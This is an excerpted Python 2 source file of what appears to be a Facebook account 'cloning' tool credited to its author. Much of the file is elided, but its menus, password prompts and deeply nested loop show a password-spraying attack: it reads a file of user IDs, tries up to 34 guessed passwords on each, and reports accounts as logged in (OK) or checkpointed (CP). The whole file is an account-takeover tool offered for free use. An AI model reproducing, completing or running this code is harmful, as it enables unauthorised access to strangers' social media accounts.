...
logo ="""
 ...
 \033[0;91m            \033[1;47m ENJOY FREE CLONING \033[0;37m

 \033[0;37m

 \033[0;91m           \033[1;47m CODED BY HARRY MALIK \033[0;37m
...
def main():
    ...
    print("\033[0;37m   (MAIN MENU)").center(50) 

    print("\x1b[0;37m--------------------------------------------------")

    print("\x1b[0;37m [1]\x1b[0;37m START FILE CLONING")

    print(" \x1b[0;37m[2]\x1b[0;37m HSP SERVER")
...
def log_sel():
	...
	if sel =="1":
		...
		os.system('xdg-open https://www.facebook.com/7H3.UNB3ATABL3.L4RK4W.H4RRY ')
...
def menu():
    ...
    print("\x1b[0;37m[1]\x1b[0;37m CRACK FROM AUTO PASSWORD (50) ")

    print("\x1b[0;37m[2]\x1b[0;37m CRACK FROM CHOOSE PASSWORD (VIP)")

    print("\x1b[0;37m[3]\x1b[0;37m Extract IDs")

    print("\x1b[0;37m[0]\x1b[0;37m Back")
...
def menu_option():
	...
	select = raw_input("\x1b[0;37mOption :- ")
...
def crack():
	...
	print("\x1b[0;37m [1]\x1b[0;37m CRACK FILE ")

	print("\x1b[0;37m [0]\x1b[0;37m MAIN MENU")
...
def crack_select():
	...
	select = raw_input("\033[1;37mOption :- \033[0;97m")
	...
	if select =="1":
		...
		filelist = raw_input("\x1b[0;37m[+] \x1b[0;37mInput File :- ")
	...
	print("\033[0;37m[+] Total IDs : \033[1;92m "+str(len(id)))

	print("\033[0;37m[+] Process Has Started")
	...
	def main(arg):
		...
		try:
			...
			if 'mbasic_logout_button' in sp or 'save-device' in sp:
				...
				print(' \x1b[0;32m [HSP-OK] '+uid+' | '+ps+'\033[0;97m')
				...
				if 'checkpoint' in sp:
					...
					print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps+'\033[0;97m')
					...
					if 'mbasic_logout_button' in sp or 'save-device' in sp:
						...
						print(' \x1b[0;32m [HSP-OK] '+uid+' | '+ps2+'\033[0;97m')
						...
						if 'checkpoint' in sp:
							...
							print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps2+'\033[0;97m')
							...
							if 'mbasic_logout_button' in sp or 'save-device' in sp:
								...
								print(' \x1b[0;32m [HSP-OK] '+uid+' | '+ps3+'\033[0;97m')
								...
								if 'checkpoint' in sp:
									...
									print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps3+'\033[0;97m')
									...
									if 'mbasic_logout_button' in sp or 'save-device' in sp:
										...
										print(' \x1b[0;32m [HSP-OK] '+uid+' | '+ps4+'\033[0;97m')
										...
										if 'checkpoint' in sp:
											...
											print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps4+'\033[0;97m')
											...
											if 'mbasic_logout_button' in sp or 'save-device' in sp:
												...
												print(' \x1b[0;32m [HSP-OK] '+uid+' | '+ps5+'\033[0;97m')
												...
												if 'checkpoint' in sp:
													...
													print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps5+'\033[0;97m')
													...
													if 'mbasic_logout_button' in sp or 'save-device' in sp:
														...
														print(' \x1b[0;32m [HSP-OK] '+uid+' | '+ps6+'\033[0;97m')
														...
														if 'checkpoint' in sp:
															...
															print(' \033[1;91m [HSP-CP] '+uid+' | '+ps6+'\033[0;97m')
															...
															if 'mbasic_logout_button' in sp or 'save-device' in sp:
																...
																print(' \x1b[0;32m [HSP-OK] '+uid+' | '+ps7+'\033[0;97m')
																...
																if 'checkpoint' in sp:
																	...
																	print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps7+'\033[0;97m')
																	...
																	if 'mbasic_logout_button' in sp or 'save-device' in sp:
																		...
																		print(' \x1b[0;32m [HSP-OK] '+uid+' | '+ps8+'\033[0;97m')
																		...
																		if 'checkpoint' in sp:
																			...
																			print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps8+'\033[0;97m')
																			...
																			if 'mbasic_logout_button' in sp or 'save-device' in sp:
																				...
																				print(' \x1b[0;32m [HSP-OK] '+uid+' | '+ps9+'\033[0;97m')
																				...
																				if 'checkpoint' in sp:
																					...
																					print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps9+'\033[0;97m')
																					...
																					if 'mbasic_logout_button' in sp or 'save-device' in sp:
																						...
																						print(' \x1b[0;32m [HSP-OK] '+uid+' | '+ps10+'\033[0;97m')
																						...
																						if 'checkpoint' in sp:
																							...
																							print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps10+'\033[0;97m')
																							...
																							if 'mbasic_logout_button' in sp or 'save-device' in sp:
																								...
																								print(' \x1b[0;32m [HSP-OK] '+uid+' | '+ps11+'\033[0;97m')
																								...
																								if 'checkpoint' in sp:
																									...
																									print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps11+'\033[0;97m')
																									...
																									if 'mbasic_logout_button' in sp or 'save-device' in sp:
																										...
																										print(' \x1b[0;37m [SSB-OK] '+uid+' | '+ps12+'\033[0;97m')
																										...
																										if 'checkpoint' in sp:
																											...
																											print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps12+'\033[0;97m')
																											...
																											if 'mbasic_logout_button' in sp or 'save-device' in sp:
																												...
																												print(' \x1b[0;32m [HSP-OK] '+uid+' | '+ps13+'\033[0;97m')
																												...
																												if 'checkpoint' in sp:
																													...
																													print(' \033[1;91m [HSP-CP] '+uid+' | '+ps13+'\033[0;97m')
																													...
																													if 'mbasic_logout_button' in sp or 'save-device' in sp:
																														...
																														print(' \x1b[0;32m [HSP-OK] '+uid+' | '+ps14+'\033[0;97m')
																														...
																														if 'checkpoint' in sp:
																															...
																															print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps14+'\033[0;97m')
																															...
																															if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																...
																																print(' \x1b[0;37m [SSB-OK] '+uid+' | '+ps15+'\033[0;97m')
																																...
																																if 'checkpoint' in sp:
																																	...
																																	print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps15+'\033[0;97m')
																																	...
																																	if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																		...
																																		print(' \x1b[0;32m [HSP-OK] '+uid+' | '+ps16+'\033[0;97m')
																																		...
																																		if 'checkpoint' in sp:
																																			...
																																			print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps16+'\033[0;97m')
																																			...
																																			if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																				...
																																				print(' \x1b[0;32m [HSP-OK] '+uid+' | '+ps17+'\033[0;97m')
																																				...
																																				if 'checkpoint' in sp:
																																					...
																																					print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps17+'\033[0;97m')
																																					...
																																					if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																						...
																																						print(' \x1b[0;37m [SSB-OK] '+uid+' | '+ps18+'\033[0;97m')
																																						...
																																						if 'checkpoint' in sp:
																																							...
																																							print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps18+'\033[0;97m')
																																							...
																																							if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																								...
																																								print(' \x1b[0;32m [HSP-OK] '+uid+' | '+ps19+'\033[0;97m')
																																								...
																																								if 'checkpoint' in sp:
																																									...
																																									print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps19+'\033[0;97m')
																																									...
																																									if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																										...
																																										print(' \x1b[0;32m [HSP-OK] '+uid+' | '+ps20+'\033[0;97m')
																																										...
																																										if 'checkpoint' in sp:
																																											...
																																											print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps20+'\033[0;97m')
																																											...
																																											if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																												...
																																												print(' \x1b[0;32m [HSP-OK] '+uid+' | '+ps21+'\033[0;97m')
																																												...
																																												if 'checkpoint' in sp:
																																													...
																																													print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps21+'\033[0;97m')
																																													...
																																													if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																														...
																																														print(' \x1b[0;32m [HSP-OK] '+uid+' | '+ps22+'\033[0;97m')
																																														...
																																														if 'checkpoint' in sp:
																																															...
																																															print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps22+'\033[0;97m')
																																															...
																																															if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																...
																																																print(' \x1b[0;32m [HSP-OK] '+uid+' | '+ps23+'\033[0;97m')
																																																...
																																																if 'checkpoint' in sp:
																																																	...
																																																	print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps23+'\033[0;97m')
																																																	...
																																																	if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																		...
																																																		print(' \x1b[0;32m [HSP-OK] '+uid+' | '+ps24+'\033[0;97m')
																																																		...
																																																		if 'checkpoint' in sp:
																																																			...
																																																			print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps24+'\033[0;97m')
																																																			...
																																																			if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																				...
																																																				print(' \x1b[0;32m [HSP-OK] '+uid+' | '+ps25+'\033[0;97m')
																																																				...
																																																				if 'checkpoint' in sp:
																																																					...
																																																					print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps25+'\033[0;97m')
																																																					...
																																																					if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																						...
																																																						print(' \x1b[0;32m [HSP-OK] '+uid+' | '+ps26+'\033[0;97m')
																																																						...
																																																						if 'checkpoint' in sp:
																																																							...
																																																							print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps26+'\033[0;97m')
																																																							...
																																																							if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																								...
																																																								print(' \x1b[0;32m [HSP-OK] '+uid+' | '+ps27+'\033[0;97m')
																																																								...
																																																								if 'checkpoint' in sp:
																																																									...
																																																									print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps27+'\033[0;97m')
																																																									...
																																																									if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																										...
																																																										print(' \x1b[0;32m [HSP-OK] '+uid+' | '+ps28+'\033[0;97m')
																																																										...
																																																										if 'checkpoint' in sp:
																																																											...
																																																											print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps28+'\033[0;97m')
																																																											...
																																																											if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																												...
																																																												print(' \x1b[0;32m [HSP-OK] '+uid+' | '+ps29+'\033[0;97m')
																																																												...
																																																												if 'checkpoint' in sp:
																																																													...
																																																													print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps29+'\033[0;97m')
																																																													...
																																																													if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																														...
																																																														print(' \x1b[0;32m [HSP-OK] '+uid+' | '+ps30+'\033[0;97m')
																																																														...
																																																														if 'checkpoint' in sp:
																																																															...
																																																															print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps30+'\033[0;97m')
																																																															...
																																																															if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																																...
																																																																print(' \x1b[0;32m [HSP-OK] '+uid+' | '+ps31+'\033[0;97m')
																																																																...
																																																																if 'checkpoint' in sp:
																																																																	...
																																																																	print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps31+'\033[0;97m')
																																																																	...
																																																																	if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																																		...
																																																																		print(' \x1b[0;32m [HSP-OK] '+uid+' | '+ps32+'\033[0;97m')
																																																																		...
																																																																		if 'checkpoint' in sp:
																																																																			...
																																																																			print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps32+'\033[0;97m')
																																																																			...
																																																																			if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																																				...
																																																																				print(' \x1b[1;92m [HSB-OK] '+uid+' | '+ps33+'\033[0;97m')
																																																																				...
																																																																				if 'checkpoint' in sp:
																																																																					...
																																																																					print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps33+'\033[0;97m')
																																																																					...
																																																																					if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																																						...
																																																																						print(' \x1b[0;32m [HSP-OK] '+uid+' | '+ps34+'\033[0;97m')
																																																																						...
																																																																						if 'checkpoint' in sp:
																																																																							...
																																																																							print(' \x1b[0;31m [HSP-CP] '+uid+' | '+ps34+'\033[0;97m')
	...
	print ("\x1b[0;37m[+]\x1b[0;37mProcess has been completed")

	print ("\x1b[0;37m[+]\x1b[0;37mTotal OK  "+str(len(oks)))

	print ("\x1b[0;37m[+]\x1b[0;37mTotal CP  "+str(len(cps)))

	print("\x1b[0;37m------------------------\x1b[0;37m------------------------")

	raw_input("\x1b[0;37mPress enter to back Main Menu ")
...
def choice():
	...
	print("\x1b[0;37m [1]\x1b[0;37m Crack File \x1b[1;92m   [03  Pass]")

	print("\x1b[0;37m [2]\x1b[0;37m Crack File \x1b[1;92m   [05  Pass]")

	print("\x1b[0;37m [3]\x1b[0;37m Crack File \x1b[1;92m   [10  Pass]")

	print("\x1b[0;37m [4]\x1b[0;37m Crack File \x1b[1;92m   [30  Pass]")

	print("\x1b[0;37m [5]\x1b[0;37m Crack File \x1b[1;92m   [50  Pass] ")
...
def choice_select():
	...
	select = raw_input("\033[0;37mOption :-  ")
	...
	if select =="1":
		...
		ps = raw_input("\033[0;37m[+]\x1b[0;37m Password1: ")

		ps2 = raw_input("\033[0;37m[+]\x1b[0;37m Password2: ")

		ps3 = raw_input("\033[0;37m[+]\x1b[0;37m Password3: ")

		filelist = raw_input("\x1b[0;37m[+]\x1b[0;37m File : \x1b[0;37m")
		...
		ps4 = raw_input("\033[0;37m[+]\x1b[0;37m Password4: ")

		ps5 = raw_input("\033[0;37m[+]\x1b[0;37m Password5: ")

		filelist = raw_input("\x1b[0;37m[+]\x1b[0;37mInput File : \x1b[0;37m")
		...
		ps6 = raw_input("\033[0;37m[+]\x1b[0;37m Password6: ")

		ps7 = raw_input("\033[0;37m[+]\x1b[0;37m Password7: ")
		...
		ps8 = raw_input("\033[0;37m[+]\x1b[0;37m Password8: ")

		ps9 = raw_input("\033[0;37m[+]\x1b[0;37m Password9: ")

		ps10 = raw_input("\033[0;37m[+]\x1b[0;37m Password10: ")
		...
		ps11 = raw_input("\033[0;37m[+]\x1b[0;37m Password11: ")

		ps12 = raw_input("\033[0;37m[+]\x1b[0;37m Password12: ")

		ps13 = raw_input("\033[0;37m[+]\x1b[0;37m Password13: ")

		ps14 = raw_input("\033[0;37m[+]\x1b[0;37m Password14: ")

		ps15 = raw_input("\033[0;37m[+]\x1b[0;37m Password15: ")

		ps16 = raw_input("\033[0;37m[+]\x1b[0;37m Password16: ")

		ps17 = raw_input("\033[0;37m[+]\x1b[0;37m Password17: ")

		ps18 = raw_input("\033[0;37m[+]\x1b[0;37m Password18: ")

		ps19 = raw_input("\033[0;37m[+]\x1b[0;37m Password19: ")

		ps20 = raw_input("\033[0;37m[+]\x1b[0;37m Password20: ")
	...
	print("\033[0;37m[+] TOTAL IDs :\x1b[1;92m "+str(len(id)))
	...
	raw_input("\x1b[0;37m[+]\x1b[0;37mPress enter to back Main Menu ")
